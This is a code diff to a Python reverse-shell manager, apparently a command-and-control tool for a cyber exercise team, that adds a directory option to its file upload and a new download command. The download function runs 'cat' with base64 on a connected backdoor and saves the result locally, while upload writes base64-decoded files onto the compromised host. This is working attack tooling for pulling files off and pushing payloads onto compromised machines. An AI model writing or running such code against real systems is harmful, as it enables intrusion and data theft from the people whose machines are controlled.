@@ -37,7 +37,7 @@ class ReverseShellManager:
             return None
         #read the data
         return await self.backdoors[backdoor][0].read(BUFFER_SIZE)
-    async def upload(self, backdoor, filename):
+    async def upload(self, backdoor, filename, directory="."):
         if backdoor not in self.backdoors:
             return False
         #check if the backdoor is still connected
@@ -53,12 +53,40 @@ class ReverseShellManager:
                 #encode the file to base64
                 data = base64.b64encode(data)
                 #echo the file to the backdoor with a base64 decode command
-                self.backdoors[backdoor][1].write(f"echo {data.decode()} | base64 -d > {filename}\n".encode())
+                self.backdoors[backdoor][1].write(f"echo {data.decode()} | base64 -d > {directory}/{filename}\n".encode())
                 await self.backdoors[backdoor][1].drain()
                 return True
         except Exception as e:
             print(f"Error uploading file: {e}")
             return False
+    async def download(self, backdoor, filename, directory="."):
+        if backdoor not in self.backdoors:
+            return False
+        #check if the backdoor is still connected
+        if self.backdoors[backdoor][1].is_closing():
+            #prune the backdoor
+            del self.backdoors[backdoor]
+            return False
+        #echo the file to the backdoor with a base64 decode command
+        self.backdoors[backdoor][1].write(f"cat {filename} | base64\n".encode())
+        await self.backdoors[backdoor][1].drain()
+        #read the data
+        data = await self.backdoors[backdoor][0].read(BUFFER_SIZE)
+        data = data.decode().strip().replace("\n", "")
+        print(data)
+        #decode the data
+        try:
+            data = base64.b64decode(data, validate=True)
+        except Exception as e:
+            print(f"Error decoding file: {e}")
+            return False
+        #write the file
+        with open(f"{directory}/{filename}", 'wb') as f:
+            f.write(data)
+        return True
+        
+        
+        
     async def write(self, backdoor, data) -> bool:
         if backdoor not in self.backdoors:
             return False
@@ -255,8 +283,28 @@ Go C3T, Beat Airforce
                 print("Error uploading file")
             else:
                 print("File uploaded successfully")
+        elif command[0] == "download":
+            if len(command) < 3:
+                print("Usage: download (shell_ip:shell_port) (filename) [directory]")
+                continue
+            if len(rsm.backdoors) == 0:
+                print("No reverse shells connected")
+                continue
+            if command[1] not in rsm.list_backdoors():
+                print("Invalid selection, pick one of the following:")
+                list_backdoors(rsm)
+                continue
+            selection = command[1]
+            directory = "."
+            if len(command) > 3:
+                directory = command[3]
+            if not await rsm.download(selection, command[2], directory):
+                print("Error downloading file")
+            else:
+                print(f"File downloaded successfully to {directory}/{command[2]}")
         else:
             print(f"Unknown command {command[0]}")
+            
         #commit changes
         conn.commit()
     conn.close()
